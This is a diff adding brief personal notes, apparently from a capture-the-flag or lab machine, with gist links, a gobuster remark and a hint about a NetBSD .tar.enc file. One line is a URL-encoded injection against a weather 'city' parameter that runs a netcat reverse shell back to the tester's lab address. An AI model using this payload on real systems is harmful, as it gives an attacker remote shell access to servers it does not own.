@@ -1,0 +1,9 @@
+https://gist.github.com/meskarune/5729e8d6c8428e9c70a72bed475db4e1
+https://gist.github.com/meskarune
+
+nothign on gobuster
+
+
+http://10.129.120.184/weather/forecast?city=London%27%29%3Bos.execute%28%22rm%20%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.88%209001%20%3E%2Ftmp%2Ff%22%29--)
+
+google netbsd .tar.enc
